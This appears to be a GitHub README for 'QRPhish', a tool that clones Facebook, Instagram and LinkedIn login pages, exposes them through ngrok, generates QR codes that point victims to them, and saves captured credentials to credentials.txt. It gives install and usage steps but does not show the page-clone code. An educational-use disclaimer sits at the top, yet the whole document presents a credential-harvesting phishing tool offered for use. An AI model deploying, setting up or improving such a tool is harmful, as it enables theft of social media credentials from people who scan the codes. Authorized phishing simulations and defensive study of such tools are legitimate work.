# QRPhish - Social Media QR Code Phishing Tool

## ⚠️ DISCLAIMER
**FOR EDUCATIONAL PURPOSES ONLY**

This tool is for authorized security testing only. Unauthorized access is illegal. Use only on systems you own or have explicit permission to test.

---

## Features

- Multiple platform support: Facebook, Instagram, LinkedIn
- QR code generation (terminal or image)
- Ngrok integration for public URL
- Real-time credential capture
- Authentic login page clones

---

## Requirements

- Linux (Kali, Ubuntu, Debian)
- Python 3.8+
- Ngrok

---

## Installation

```bash
# Clone repository
git clone https://github.com/cape2060/QRCode_Phishing.git
cd qrtool

# Install Python dependencies
pip3 install qrcode[pil] pillow colorama flask requests

# Install Ngrok
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xvzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/

# Configure Ngrok (optional)
ngrok config add-authtoken YOUR_AUTH_TOKEN
```

---

## Usage

```bash
# Run the tool
python3 qrtool.py

# Select platform (1-3)
1). Facebook
2). Instagram
3). LinkedIn
4). Exit

# Choose output type
terminal - Display QR in console
image    - Save to images/Phishing.png

# Monitor credentials in real-time
# All data saved to credentials.txt
```

---

## Project Structure

```
qrtool/
├── qrtool.py              # Main script
├── credentials.txt        # Captured credentials
├── images/                # QR codes and logos
├── Facebook/              # Facebook module
│   ├── app.py
│   ├── templates/
│   └── static/
├── Instagram/             # Instagram module
│   ├── app.py
│   ├── templates/
│   └── static/
└── LinkedIn/              # LinkedIn module
    ├── app.py
    ├── templates/
    └── static/
```

---

## Troubleshooting

**Ngrok not found:**
```bash
sudo apt install ngrok
```

**Port already in use:**
```bash
sudo lsof -ti:5000 | xargs kill -9
```

**Module not found:**
```bash
pip3 install qrcode[pil] pillow flask
```

**Ngrok connection failed:**
```bash
ngrok authtoken YOUR_TOKEN
```

---

## FAQ

**Q: Is this legal?**  
A: Only with explicit written permission for authorized testing.

**Q: Do I need a paid Ngrok account?**  
A: No, free tier works fine.

**Q: Where are credentials saved?**  
A: In `credentials.txt` in the main directory.

**Q: How do I stop the tool?**  
A: Press `Ctrl+C` or select option 4 (Exit).

---

## Author

**cape2060** - [GitHub](https://github.com/cape2060)

---

## License

MIT License - See LICENSE file for details.

---

**Remember: With great power comes great responsibility. Use ethically and legally.**
